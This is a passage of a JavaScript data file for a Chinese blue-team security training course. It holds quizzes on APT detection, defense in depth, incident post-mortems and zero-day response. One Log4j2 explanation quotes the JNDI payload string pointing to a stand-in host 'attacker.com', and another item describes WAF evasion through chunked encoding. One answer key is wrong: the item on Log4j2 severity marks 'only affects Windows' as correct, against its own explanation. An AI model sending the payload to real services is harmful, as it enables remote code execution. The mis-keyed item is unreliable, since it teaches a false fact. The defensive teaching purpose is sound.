      {question:'Kill Chain模型中，攻击者在目标系统安装后门的阶段叫什么？',options:['侦察(Recon)','投递(Delivery)','安装(Installation)','行动(Actions)'],correctIndex:2,explanation:'安装阶段=攻击者在目标系统安装持久化后门（Webshell、远控木马、注册表自启动），为后续C2通信铺路。'},
      {question:'WAF绕过中，利用分块传输编码(Chunked Transfer Encoding)防护的原理是什么？',options:['将Payload拆分成多个小块传输，WAF可能无法拼合完整恶意Payload','加密整个请求','改变请求方法','使用HTTPS'],correctIndex:0,explanation:'分块传输=将一个HTTP请求体拆成多个chunk，WAF如果不对chunk拼合后再检测，恶意Payload可能被分到两个chunk中从而绕过。'},
      {type:'fill',question:'三源日志关联分析的"三源"是：___日志、Web服务器日志和网络流量包(PCAP)。',correctAnswer:'系统',explanation:'三源=系统日志(Win/Linux)+Web日志+PCAP。三者互为补充，才能还原完整攻击链。'},
      {type:'multiple',question:'以下哪些属于应急排查的5项核心动作？（多选）',options:['进程排查','服务检查','启动项检查','计划任务检查','日志分析'],correctIndices:[0,1,2,3,4],explanation:'五项核心动作覆盖后门所有可能的持久化位置。'},
      {type:'boolean',question:'扫描类告警和入侵类告警的处置优先级应该相同。',options:['正确','错误'],correctIndex:1,explanation:'错误！入侵类(P0/P1)=立即应急，扫描类(P2/P3)=封禁+观察。区别对待以合理分配有限的应急资源。'},
      {question:'发现Webshell后的正确处置顺序是？',options:['直接删除→重启','备份证据→遏制→清除→加固→报告','格式化服务器','不处理等指示'],correctIndex:1,explanation:'固定证据→限制影响→清除威胁→堵住入口→记录归档。缺一不可。'},
      {type:'fill',question:'威胁情报中，TTPs是指攻击者的___、___和步骤，比IOC更难以改变。',correctAnswer:'战术/技术',explanation:'TTPs=Tactics+Techniques+Procedures，描述攻击者的行为习惯而非可变的指纹特征。'},
      {question:'使用VirusTotal查询文件时，以下哪种做法是正确的？',options:['任何文件都可以提交','确认不涉及敏感数据后再提交','直接用免费API批量提交企业文件','把数据库文件上传检查'],correctIndex:1,explanation:'VT免费版提交的文件会被社区共享。查询前必须确认不涉及企业内部敏感数据，否则可能造成数据泄露。'},
      {question:'日报中TOP事件部分应包含几件事件？',options:['所有事件','3-5件最重要事件','至少20件','只有1件'],correctIndex:1,explanation:'3-5件=关键且可消化。让读者在1分钟内了解本班次最重要的安全事件。'},
      {type:'boolean',question:'SOP写好后就一劳永逸了，不需要更新。',options:['正确','错误'],correctIndex:1,explanation:'错误！SOP需持续迭代更新以适应新的攻击手法和处置经验。'},
      // 实战场景
      {question:'WAF拦截了一个HTTP请求，日志显示Payload中包含"union select"，但经核查这是正常论坛搜索关键词。应如何处理？',options:['不做任何处理','为该URL+参数添加白名单例外','关闭WAF的SQL注入检测规则','封禁搜索IP'],correctIndex:1,explanation:'这是典型误报：业务搜索输入了看起来像SQL关键字的内容。应精确加白该URL路径+参数，而非全局关闭规则。'},
      {type:'fill',question:'多源日志关联分析的核心价值是将散落的单点告警串成___的攻击链路。',correctAnswer:'完整/端到端',explanation:'从"只看到孤立告警"到"还原攻击全过程"是中级岗的标志性能力提升。'},
      {question:'攻击时间线还原中，发现Web日志显示10:05上传了shell.php，但系统日志显示10:05:30出现cmd.exe进程（父进程w3wp.exe），这个时间差说明了什么？',options:['日志时间不准','Webshell被上传后30秒内就被触发了','两个日志不相关','无需关注'],correctIndex:1,explanation:'上传后立即触发=攻击者使用自动化工具，上传完毕后立刻发送请求激活Webshell。也说明攻击者有明确的后续动作意图。'},
      {type:'multiple',question:'中级岗应具备的日报撰写能力包括？（多选）',options:['能总结攻击趋势变化（数据+图表）','能从多起事件中提炼共性和规律','能提出基于数据的防守策略优化建议','只需把告警列表粘贴进去'],correctIndices:[0,1,2],explanation:'中级岗日报=数据分析+趋势洞察+优化建议。粘贴告警列表是初级岗的做法。'},
      {type:'boolean',question:'完成第二阶段（Day 8-14）后，蓝队应能独立设计企业纵深防御方案。',options:['正确','错误'],correctIndex:1,explanation:'错误！独立设计企业级防御方案是第三阶段（Day 15-21）的目标。第二阶段目标是独立完成深度研判和溯源。'},
      {question:'IOC和TTPs在溯源中哪个更重要？',options:['IOC更重要','两者互补：IOC用于快速检测，TTPs用于深度溯源和归因','TTPs完全没用','都不重要'],correctIndex:1,explanation:'IOC=快速匹配已知威胁（速度），TTPs=深度理解攻击者行为（深度）。两者结合才能实现"快检"+"深溯"。'},
      {type:'fill',question:'第二阶段毕业的核心标志是：能独立完成从___到复盘的完整事件处置闭环。',correctAnswer:'告警研判',explanation:'从收到告警→核查研判→处置遏制→溯源分析→复盘报告，全流程独立完成，不需他人指导。'},
      {question:'案例分析：日志显示某IP在一小时内依次执行了以下行为：端口扫描→SQL注入探测→成功利用SQL注入获取数据→在内网扫描SMB端口。这说明了什么？',options:['只是巧合','这是完整的Kill Chain：侦察→利用→安装→横向移动','日志记录有误','正常运维行为'],correctIndex:1,explanation:'从侦察到横向移动的完整攻击链，说明攻击者已突破边界并开始内网渗透。需立即启动高级别应急响应。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  // ==================== 第三阶段：高阶攻坚周（Day15-Day21） ====================
  {
    id: 'hw-e28-15', day: 15,
    title: 'APT攻击与高阶隐蔽攻击',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出APT攻击检测要点对照表', '理解APT全生命周期', '掌握隐蔽攻击检测思路'],
    keyPoints: ['微步APT全生命周期', '定向钓鱼攻击', '0day利用检测', '流量+日志检测要点', '国内APT组织'],
    content: `# Day 15：APT攻击与高阶隐蔽攻击

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：微步APT全生命周期 + 护网高阶隐蔽攻击盘点
- 文档：国内APT组织报告

## 🔧 实操任务
- 复盘2起定向钓鱼+0day利用事件
- 提炼检测要点（流量+日志）

## ✅ 验收标准
- 输出《APT攻击检测要点对照表》`,
    quiz: [
      // APT攻击
      {question:'APT攻击的核心特征不包括以下哪一项？',options:['长期潜伏','定向精准','自动化批量攻击','隐蔽性强'],correctIndex:2,explanation:'APT=高级持续性威胁，特点是定向、隐蔽、长期潜伏。自动化批量攻击更符合蠕虫/僵尸网络特征。'},
      {question:'APT（高级持续性威胁）中"持续性（Persistent）"最关键的含义是什么？',options:['攻击会持续到目标被摧毁','攻击者长期潜伏、持续窃取数据，而非一次性入侵','攻击从不停止','蓝队需要持续加班'],correctIndex:1,explanation:'APT的持续性=攻击者长期驻留目标网络，持续窃取情报/数据，可能长达数月甚至数年。这也是APT最难检测的原因。'},
      {type:'fill',question:'APT的全称是Advanced Persistent ___。',correctAnswer:'Threat',explanation:'APT=Advanced Persistent Threat（高级持续性威胁），是由国家级或组织化攻击者发起的长期、定向、隐蔽的攻击活动。'},
      {type:'boolean',question:'国内知名的APT组织包括海莲花（OceanLotus）、毒云藤（APT-C-01）等，这些组织常针对中国目标。',options:['正确','错误'],correctIndex:0,explanation:'正确。这些均为活跃的针对中国的APT组织，了解其TTPs对护网攻防有重要价值。'},
      {type:'multiple',question:'APT攻击与普通网络攻击的主要区别有哪些？（多选）',options:['APT高度定向（针对特定目标）','APT长期潜伏（数月至数年）','APT使用定制化工具（非通用恶意软件）','APT通常有国家/组织背景支撑'],correctIndices:[0,1,2,3],explanation:'以上四项均为APT核心特征。APT与普通攻击的本质区别在于背后的资源投入和组织化程度。'},
      // APT全生命周期
      {question:'APT攻击生命周期通常分为几个阶段？',options:['3个','5-7个（侦察→武器化→投递→利用→安装→C2→行动）','10个','没有固定阶段'],correctIndex:1,explanation:'APT同样遵循Kill Chain模型（7阶段），但APT在每个阶段投入更多资源和时间，特别是在"侦察"和"横向移动"阶段。'},
      {type:'fill',question:'APT攻击中最具特征性的阶段是___（横向移动），攻击者在拿下边界后在内网中逐步扩散，寻找高价值目标。',correctAnswer:'横向移动/lateral movement',explanation:'横向移动是APT的招牌动作——不满足于边界突破，持续向内网渗透直到拿下域控或数据库等核心资产。'},
      // 定向钓鱼攻击
      {question:'APT组织常用的定向钓鱼（Spear Phishing）与普通钓鱼邮件的区别是什么？',options:['没有区别','定向钓鱼针对特定个人/组织精心设计，邮件内容高度定制化','定向钓鱼技术含量更低','定向钓鱼成功率更低'],correctIndex:1,explanation:'定向钓鱼=精准制导。攻击者事先研究目标（社交网络/职位/项目），邮件内容高度个性化，让受害者难以分辨真假。'},
      {type:'boolean',question:'钓鱼邮件中，通过查看发件人显示名称即可判断是否为真实发件人。',options:['正确','错误'],correctIndex:1,explanation:'错误！发件人显示名称可任意伪造。应查看邮件头中的Return-Path/DKIM签名等验证邮件的真实来源。'},
      // 0day利用检测
      {question:'0day漏洞最令蓝队头疼的特征是什么？',options:['漏洞危害太小','没有已知签名/补丁，安全设备无法基于特征库检测','0day很容易被发现','0day只会影响旧系统'],correctIndex:1,explanation:'0day=零日漏洞=厂商尚未发布补丁的漏洞。因为无已知特征，传统基于签名的检测（IDS/AV/WAF）均无法识别。需要基于行为和异常来检测。'},
      {type:'fill',question:'对抗0day攻击最有效的检测手段不是签名匹配，而是基于___的检测（如异常进程行为、异常网络通信模式）。',correctAnswer:'行为/异常',explanation:'行为检测=建立正常基线，检测偏离基线的异常行为。即使没有0day的特征签名，异常行为本身（如word.exe创建cmd.exe子进程）就是告警信号。'},
      // 流量+日志检测
      {question:'检测APT攻击中隐蔽的C2通信，最有效的流量特征是什么？',options:['大流量下载','周期性心跳包（定时、小数据量、固定/规律间隔）','一次性大流量上传','短时间端口扫描'],correctIndex:1,explanation:'C2心跳=后门定期向控制端"打卡"（通常5分钟-4小时一次），流量特征为：小数据包、规律间隔、固定目标（IP/域名）。'},
      {type:'multiple',question:'以下哪些是检测APT攻击的有效手段？（多选）',options:['基于异常的流量检测','日志关联分析（多源串联）','威胁情报匹配（已知APT IOC）','沙箱动态分析'],correctIndices:[0,1,2,3],explanation:'APT检测需多管齐下：异常检测+日志关联+情报匹配+沙箱分析，任何单一手段都可能被绕过。'},
      {question:'在日志中发现某用户工作日白天从未登录，但在连续三个周末的凌晨3点有远程登录记录（事件ID 4624，类型10），这最可能说明什么？',options:['用户突然变勤奋了','账户凭证可能已被APT攻击者窃取并在非工作时间使用','系统自动维护','日志时间错误'],correctIndex:1,explanation:'非工作时间的异常登录是APT常用手法——利用非工作时间（减少被发现概率）进行操作。需立即排查该账户的所有操作记录。'},
      {type:'boolean',question:'检测到C2通信后，最快最有效的遏制手段是立即在防火墙/网络层阻断目标C2地址的出站通信。',options:['正确','错误'],correctIndex:0,explanation:'正确。阻断C2通信=切断攻击者远程控制通道，是最有效的遏制手段。但需同时排查后门本身，否则攻击者可能切换到备用C2。'},
      // 国内APT组织
      {type:'fill',question:'国内常见的APT组织包括海莲花、毒云藤、___等，了解其TTPs有助-于护网中的威胁狩猎。',correctAnswer:'蔓灵花/APT-C-08',explanation:'海莲花(OceanLotus)、毒云藤(APT-C-01)、蔓灵花(APT-C-08)等是国内针对中国目标的活跃APT组织。了解其惯用的TTPs可以帮助蓝队制定有针对性的检测规则。'},
      {question:'MITRE ATT&CK框架在APT检测中的主要价值是什么？',options:['提供了漏洞利用代码','将APT攻击行为标准化为统一的技术分类体系（Tactics+Techniques），蓝队可据此逐个技术点构建检测覆盖','直接阻断APT攻击','没有任何价值'],correctIndex:1,explanation:'ATT&CK=APT行为的百科全书。蓝队根据ATT&CK矩阵逐一检查：我的检测能力覆盖了哪些技术点？还有哪些技术点没有检测覆盖？'},
      {type:'multiple',question:'ATT&CK企业矩阵中的战术（Tactics）包含哪些？（多选）',options:['初始访问(Initial Access)','执行(Execution)','持久化(Persistence)','横向移动(Lateral Movement)','数据渗出(Exfiltration)'],correctIndices:[0,1,2,3,4],explanation:'以上均为ATT&CK Enterprise Matrix的核心战术。完整矩阵包含14个战术，覆盖攻击全生命周期。'},
      {type:'boolean',question:'ATT&CK框架中的技术（Techniques）条目越多，说明该攻击手法就越危险。',options:['正确','错误'],correctIndex:1,explanation:'错误！ATT&CK中技术条目数量反映的是该技术被观察到的广泛性和多样性，与危险性没有直接关系。'},
      {question:'蓝队如何利用ATT&CK框架提升检测覆盖率？',options:['逐行阅读整个框架','以ATT&CK战术为横轴、数据源为纵轴，构建检测覆盖矩阵，找出检测盲区','背诵所有技术ID','不需要使用ATT&CK'],correctIndex:1,explanation:'实用做法=构建覆盖矩阵：每个技术点标注检测数据源(有无日志)+检测方法(有无规则/告警)+覆盖率(高中低无)，优先补齐高风险技术点的检测。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-16', day: 16,
    title: '全网纵深防御架构设计',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出企业护网整体防守策略方案', '掌握分层防守策略设计（边界/内网/终端）', '了解等保2.0要求'],
    keyPoints: ['企业纵深防御', '分层防守（边界/内网/终端）', '等保2.0', '防御架构设计'],
    content: `# Day 16：全网纵深防御架构设计

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：企业纵深防御 + 护网整体防守方案
- 文档：等保2.0要求

## 🔧 实操任务
- 给定企业网络拓扑+资产列表
- 设计分层防守策略（边界/内网/终端）

## ✅ 验收标准
- 输出《企业护网整体防守策略方案》`,
    quiz: [
      // 纵深防御
      {type:'multiple',question:'纵深防御的三层架构通常包括哪些层级？（多选）',options:['边界防护层','内网防护层','终端防护层','云安全层'],correctIndices:[0,1,2],explanation:'经典三层=边界（防火墙/WAF/IDS）→内网（流量分析/网络分段）→终端（EDR/主机安全）。'},
      {question:'等保2.0"一个中心、三重防护"中，"一个中心"指什么？',options:['安全管理中心','数据中心','运维中心','监控中心'],correctIndex:0,explanation:'一个中心=安全管理中心，三重防护=安全计算环境、安全区域边界、安全通信网络。'},
      {type:'fill',question:'纵深防御的核心思想是___，即不依赖单一安全措施，而是通过多层不同性质的安全控制形成防御纵深。',correctAnswer:'多层防御/defense in depth',explanation:'纵深防御=Defense in Depth。如果攻击者突破一层，还有下一层等着他。每一层使用不同的检测/防御技术，增加攻击难度。'},
      {question:'在边界防护层的部署中，以下哪种安全设备应该放在最前面？',options:['WAF','IDS','传统防火墙','堡垒机'],correctIndex:2,explanation:'防火墙是第一道关卡（基于IP/端口过滤），WAF部署在防火墙之后（Web应用层过滤），IDS旁路接入（被动分析流量）。'},
      {type:'boolean',question:'纵深防御意味着部署所有可能的安全设备，越多越好。',options:['正确','错误'],correctIndex:1,explanation:'错误！纵深防御≠堆砌设备。核心原则是：各层功能互补不重复、告警能联动而非各自孤岛、安全管理不失控（不要买了用不起来）。'},
      // 分层防守
      {question:'边界防护层最主要防护什么？',options:['内部员工误操作','来自互联网的扫描、DDoS、漏洞利用等外部攻击','终端病毒感染','物理安全'],correctIndex:1,explanation:'边界防护=防外部。防火墙+WAF+抗DDoS=互联网攻击的第一道防线。但仅靠边界不够，假设攻击者已经突破边界是纵深防御的基本假设。'},
      {type:'fill',question:'内网防护层主要通过___技术将不同安全等级的资产划分到不同的网络区域，限制横向移动。',correctAnswer:'网络分段/VLAN划分/微隔离',explanation:'网络分段=VLAN划分+访问控制列表(ACL)，将Web服务器、数据库、办公网络分隔开。即使Web服务器被攻破，黑客也无法直接访问数据库区域。'},
      {type:'fill',question:'终端防护层的核心设备是___（英文缩写），可以实现主机级别的恶意行为检测和自动响应。',correctAnswer:'EDR',explanation:'EDR=Endpoint Detection and Response（终端检测与响应），记录主机上的进程/文件/网络/注册表行为，可检测和阻断无文件攻击、勒索软件等。'},
      {question:'等保2.0中"三重防护"不包括以下哪一项？',options:['安全计算环境','安全区域边界','安全通信网络','安全人事管理'],correctIndex:3,explanation:'三重防护=安全计算环境+安全区域边界+安全通信网络。安全管理中心对三重防护进行统一管理和监控。'},
      {type:'multiple',question:'以下哪些是企业纵深防御中常用的安全设备？（多选）',options:['防火墙','WAF','IDS/IPS','EDR','DLP(数据防泄漏)'],correctIndices:[0,1,2,3,4],explanation:'以上均为纵深防御体系中的标准配置。DLP=Data Loss Prevention（数据防泄漏），防止敏感数据外泄。'},
      // 等保2.0
      {type:'boolean',question:'等保2.0只适用于政府机关，企业不需要遵守。',options:['正确','错误'],correctIndex:1,explanation:'错误！等保2.0适用于所有在中国境内的网络运营者，包括企业、政府、事业单位等。不履行等保义务将面临行政处罚。'},
      {question:'等保2.0将信息系统安全保护等级划分为几级？',options:['3级','5级','7级','10级'],correctIndex:1,explanation:'等保分为5个等级（第一级到第五级），安全要求逐级增高。护网中通常要求第三级（安全标记保护级）及以上的防护能力。'},
      {type:'fill',question:'等保2.0中强调的"___"原则是指在安全建设时要同步规划、同步建设、同步使用安全措施。',correctAnswer:'三同步',explanation:'三同步=同步规划+同步建设+同步使用。安全不能是事后补救——系统上线之日就是安全防护到位之时。'},
      // 防御架构设计
      {question:'设计企业护网防守方案时，第一件事应该做什么？',options:['部署安全设备','全面资产梳理——搞清楚有哪些资产、在哪里、有多重要','制定值班表','编写报告'],correctIndex:1,explanation:'资产梳理=所有防守的起点。不知道保护什么，就无法制定有效的防守策略。梳理内容包括IP/域名/端口/服务/责任人/业务重要性。'},
      {type:'fill',question:'在高价值资产周围部署更密集的安全监控和访问控制，这种策略称为___防御。',correctAnswer:'重点/靶心',explanation:'重点防御=好钢用在刀刃上。域控、核心数据库、堡垒机等高价值目标周围部署额外安全层（蜜罐、网络流量分析、特权访问管理）。'},
      {type:'multiple',question:'设计纵深防御方案时，以下哪些原则是必须遵循的？（多选）',options:['最小权限原则(Least Privilege)','深度防御原则(Defense in Depth)','默认拒绝原则(Default Deny)','单点防御原则(单一设备解决所有问题)'],correctIndices:[0,1,2],explanation:'三项核心原则。最小权限=每个人/系统只能访问工作需要的最小范围；默认拒绝=一切未明确允许的访问全部禁止。单点防御正是纵深防御要避免的。'},
      {question:'终端防护层（EDR/AV）和内网防护层（流量分析）之间如何联动？',options:['无法联动','当EDR发现某主机异常时，可触发内网流量分析系统重点关注该主机的外联流量','它们是完全独立的两层','只需要EDR就够'],correctIndex:1,explanation:'联动场景=EDR发现主机新建了可疑进程→通知流量分析系统对该主机的出站流量做深度分析→确认是否为C2通信→联动防火墙自动阻断。这是纵深防御的理想工作模式。'},
      {type:'boolean',question:'部署了纵深防御体系就可以高枕无忧，因为攻击者不可能突破这么多层防御。',options:['正确','错误'],correctIndex:1,explanation:'错误！纵深防御只是增加攻击难度和发现概率，不是保证绝对安全。APT攻击者有资源和耐心逐一突破各层。纵深防御的真正价值在于提供多道检测机会。'},
      {question:'以下哪项最能体现纵深防御的精髓？',options:['只靠防火墙','假设外层已失守——每一层都独立具备检测能力，不依赖外层防御','所有设备都买最贵的','让一个设备干所有的活'],correctIndex:1,explanation:'纵深防御的核心假设=任何单层都可能被突破。因此每层都应独立具备检测能力，即使防火墙被绕过，WAF/流量分析/EDR仍能发现攻击。'},
      {type:'fill',question:'在安全架构中，___是指将高度敏感的管理操作与日常工作使用的环境物理或逻辑隔离（如用独立的管理终端管理核心设备）。',correctAnswer:'带外管理/PAW/Privileged Access Workstation',explanation:'PAW(特权访问工作站)=专用安全工作站，只用于管理核心资产（如域控），不用于日常办公、上网等，最大程度减少攻击面。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-17', day: 17,
    title: '重大事件深度溯源与5Why复盘',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出含根因分析的重大安全事件深度复盘报告', '掌握5Why根因分析法', '完成从告警到根因的深度溯源'],
    keyPoints: ['奇安信溯源实战', '电子取证规范', '5Why根因分析法', '整改方案输出'],
    content: `# Day 17：重大事件深度溯源与5Why复盘

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：奇安信溯源实战 + 电子取证规范
- 新增：引入5Why根因分析法

## 🔧 实操任务
- 模拟APT入侵事件
- 完成从告警到根因的深度溯源，输出整改方案

## ✅ 验收标准
- 输出《重大安全事件深度复盘报告》（含根因分析）`,
    quiz: [
      // 5Why分析
      {question:'5Why分析法中"5"的含义是什么？',options:['必须问满5次','至少问5次直到找到根因','只能问5个问题','找到第5个责任人'],correctIndex:1,explanation:'"5"并非固定数字，而是一种思维方式——连续追问"为什么"，直到无法再深入、触达根本原因。'},
      {type:'fill',question:'安全事件复盘中使用5Why分析法，目的是从___现象层层递进，追溯到系统性的根本原因。',correctAnswer:'表面',explanation:'5Why从表面现象层层剥开，追问到系统性问题和管理根因，避免"头痛医头，脚痛医脚"。'},
      {question:'以下哪个是5Why分析的正确应用示例？',options:['Webshell被上传→因为WAF被绕过→为什么不更新WAF规则？→因为没有定期更新流程→为什么没有？→因为没有安全运维SOP→根因：缺少运维规范化','Webshell被上传→因为黑客厉害→根因：黑客太强','Webshell被上传→因为员工不小心→根因：员工不行','Webshell被上传→不知道什么原因→不分析了'],correctIndex:0,explanation:'5Why应该从事件表象（Webshell上传）层层追溯，直到发现系统性问题（没有运维SOP）。每次追问都要基于事实而非假设。'},
      {type:'boolean',question:'5Why分析的本质是追责——找到是谁的错。',options:['正确','错误'],correctIndex:1,explanation:'错误！5Why本质是找系统性问题而非找责任人。目标是从流程/制度/技术层面消除根因，防止同类事件重复发生。'},
      // 深度溯源
      {question:'重大安全事件深度溯源中，最重要的产出是什么？',options:['找出责任人','还原完整攻击路径+识别防御体系缺口+提出可落地的整改方案','写长篇报告','开除相关人员'],correctIndex:1,explanation:'深度溯源价值=攻击路径+防御缺口+整改方案。不仅仅知道"发生了什么"，还要知道"防御体系哪里出了问题"以及"如何修复"。'},
      {type:'fill',question:'电子取证中，优先收集___性证据（内存、网络连接、进程信息），再收集___性证据（硬盘镜像、日志文件）。',correctAnswer:'易失/持久',explanation:'证据收集顺序=从易失到持久。内存/网络连接一旦关机就会丢失，应最先固定。硬盘和日志可以之后再完整镜像。'},
      {type:'multiple',question:'深度溯源的完整的攻击路径还原应包含哪些要素？（多选）',options:['攻击入口（最初如何进入）','权限提升方式','横向移动路径','数据窃取方式和目的地','攻击者使用的工具和IP'],correctIndices:[0,1,2,3,4],explanation:'完整攻击路径=入口+提权+横向+窃取+工具。每个环节都要有具体证据支撑（日志/流量/文件）。'},
      // 整改方案
      {question:'好的整改方案最重要的特征是什么？',options:['写得很多很长','每项整改措施都有明确的责任人、截止时间、可验证的验收标准','整改项越多越好','只需列出问题不需要方案'],correctIndex:1,explanation:'合格整改=可执行、可追踪、可验证。说"加强监控"没有用，要说"在SIEM中添加检测规则X，责任人张三，6月20日前完成，验收标准：能检测到测试攻击"。'},
      {type:'fill',question:'整改方案中，"___"是指彻底消除漏洞根源的措施（如修复代码漏洞），"___"是指增加检测/防护层使得即使漏洞未修复也难以被利用。',correctAnswer:'根治/缓解',explanation:'根治=修复根本原因（堵住漏洞）。缓解=增加防护层（WAF规则/权限限制）。理想情况做根治，紧急情况先缓解同时推进根治。'},
      {type:'boolean',question:'完成溯源和整改方案后，事件就可以彻底关闭了，不需要跟踪验证整改效果。',options:['正确','错误'],correctIndex:1,explanation:'错误！整改方案下发后，需要在约定时间复查验证：整改是否已执行？效果是否达到预期？是否引入了新问题？这是一个闭环。'},
      // 奇安信溯源实战
      {question:'在APT溯源中，"归因"（Attribution）指的是什么？',options:['知道攻击者姓名','通过技术手段（工具特征/TTPs/语言/时区等）推断可能的攻击组织/国家背景','找出所有被攻击的IP','统计攻击次数'],correctIndex:1,explanation:'归因=通过TTPs、代码特征、语言、时区、C2基础设施重叠等多维度信息，推断攻击者可能的组织归属。归因是高置信度推断而非100%确认。'},
      {type:'fill',question:'溯源中最有价值的证据是攻击者的___（TTPs），因为它难以改变且具有组织特征。',correctAnswer:'技战法/行为模式',explanation:'TTPs=攻击者的行为习惯和惯用方法，像人的"笔迹"一样难以改变。代码复用、同样的工具链、同样的命名习惯=同源攻击的强有力证据。'},
      {question:'蓝队溯源时发现，本次攻击使用的C2域名注册人是中文拼音、命令控制面板使用了中文错误提示、工具代码注释也是中文，这暗示了什么？',options:['攻击者可能是中文使用者，但不能单凭这一点确定来源','攻击者一定是中国人','工具一定是中国开发的','代码注释没有意义'],correctIndex:0,explanation:'语言线索是归因的重要维度之一，但攻击者可以故意留下假线索（False Flag）。需结合TTPs、基础设施、目标选择等多维度交叉验证。'},
      // 复盘报告
      {question:'重大安全事件复盘报告的价值在于什么？',options:['存档备查','深入分析"为什么会发生"而非仅仅"发生了什么"，将教训固化为组织能力','满足合规要求','只有领导会看'],correctIndex:1,explanation:'复盘报告的核心价值=将一次事件的经验教训转化为组织知识。这次在这里摔了，下次（以及其他人）就不会在同样的地方再摔。'},
      {type:'multiple',question:'一份完整的事件复盘报告至少应包含哪些章节？（多选）',options:['事件概述（时间线、影响范围）','攻击路径还原（攻击链完整回顾）','根因分析（5Why/鱼骨图）','整改方案（责任人+时间表）','经验教训总结'],correctIndices:[0,1,2,3,4],explanation:'五项均为复盘报告核心章节。好的复盘报告不是"做了什么"的流水账，而是"学到了什么"的知识沉淀。'},
      {type:'fill',question:'大中型安全事件的复盘报告应遵循___原则：不指责、不追责、聚焦于系统和流程的改进。',correctAnswer:'免责/无过错/blameless',explanation:'免责复盘（Blameless Postmortem）=聚焦系统问题而非个人过错。如果复盘变成追责会，人们会隐藏错误而不是暴露问题。'},
      {type:'boolean',question:'复盘只需要在重大安全事件后进行，日常事件不需要复盘。',options:['正确','错误'],correctIndex:1,explanation:'错误！日常事件也要定期汇总复盘（如周复盘），很多重大事件的苗头都隐藏在日常"小事件"的模式中。积少成多的复盘价值不可忽视。'},
      {question:'某公司发生的Webshell入侵事件复盘发现：漏洞来源是一台因为"不重要"而从未打补丁的测试服务器。5Why根因最可能是什么？',options:['测试服务器不重要','组织缺少全量资产管理流程，测试/边缘资产未纳入安全管控范围','补丁没有用','黑客运气好'],correctIndex:1,explanation:'5Why深挖=测试服务器为什么没打补丁→因为不知道这台服务器存在→为什么不知道→因为资产梳理没有覆盖测试环境→根因=资产管理制度不完善。'},
      {question:'重大事件复盘后，整改方案中优先级最高的项目应该是什么？',options:['全员安全培训','堵住本次事件中暴露的具体漏洞入口','增加新的安全设备','撰写长篇总结'],correctIndex:1,explanation:'最优先=堵住同类漏洞不再发生同样攻击。然后才是完善检测能力以防类似攻击、最后是整体安全能力提升。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-18', day: 18,
    title: '新型高危漏洞应急响应（0day）',
    subtitle: '高阶攻坚周（中级→高级岗技术达标）',
    objectives: ['输出高危漏洞应急处置指南', '掌握从发现到处置的完整方案编写', '了解CNVD预警流程'],
    keyPoints: ['绿盟漏洞应急', 'Log4j2全流程复盘', '0day/Nday应急', 'CNVD预警模板', '漏洞处置方案'],
    content: `# Day 18：新型高危漏洞应急响应（0day）

> **阶段**：高阶攻坚周（中级→高级岗技术达标）

## 📚 核心学习内容
- 视频：绿盟漏洞应急 + Log4j2全流程复盘
- 文档：CNVD预警模板

## 🔧 实操任务
- 选定1个真实高危漏洞（如近期N-Day）
- 编写从发现到处置的完整方案

## ✅ 验收标准
- 输出《高危漏洞应急处置指南》+ 专项应急方案`,
    quiz: [
      // Log4j2
      {question:'Log4j2漏洞（CVE-2021-44228）的漏洞类型是什么？',options:['SQL注入','远程代码执行(RCE)','跨站脚本(XSS)','文件上传漏洞'],correctIndex:1,explanation:'Log4j2是JNDI注入导致的远程代码执行(RCE)漏洞，CVSS评分10.0，影响了全球大量Java应用。'},
      {type:'fill',question:'Log4j2漏洞（Log4Shell）利用了Log4j2的___功能，攻击者通过构造特殊字符串触发远程类加载。',correctAnswer:'JNDI/LDAP',explanation:'Log4j2在解析${jndi:ldap://attacker.com/evil}格式的日志消息时，会通过JNDI协议连接攻击者的LDAP服务器下载并执行恶意类。'},
      {type:'boolean',question:'高危漏洞应急时，应等补丁全量验证完成后再通知业务方，避免引起不必要的恐慌。',options:['正确','错误'],correctIndex:1,explanation:'错误！应先立即通知业务方并采取WAF规则等临时缓解措施，同时并行推进补丁修复。'},
      {question:'Log4j2漏洞被称为"核弹级"漏洞的主要原因是什么？',options:['影响范围极广（几乎所有Java应用）+利用门槛极低+CVSS 10.0满分','只能影响Windows系统','需要有管理员权限才能利用','需要物理接触服务器'],correctIndex:1,explanation:'Log4j2是Java生态最通用的日志库，几乎所有Java应用都依赖它——从Minecraft游戏服务器到银行核心系统。一行日志就能触发RCE。'},
      // 0day/Nday应急
      {question:'0day漏洞应急响应中，最快最有效的临时缓解手段是什么？',options:['等厂商发布补丁','通过WAF/IPS部署虚拟补丁（Virtual Patch）','关闭所有服务','重启服务器'],correctIndex:1,explanation:'虚拟补丁=在WAF/IPS上添加规则拦截恶意Payload，在无需修改应用代码的情况下提供临时防护。这是0day应急的黄金24小时方案。'},
      {type:'fill',question:'高危漏洞应急响应的标准流程是：获取情报→___→临时缓解→补丁修复→验证闭环。',correctAnswer:'影响面评估',explanation:'影响面评估=有多少系统受影响？哪些是核心系统？暴露在互联网还是仅内网？根据影响面决定响应优先级和资源分配。'},
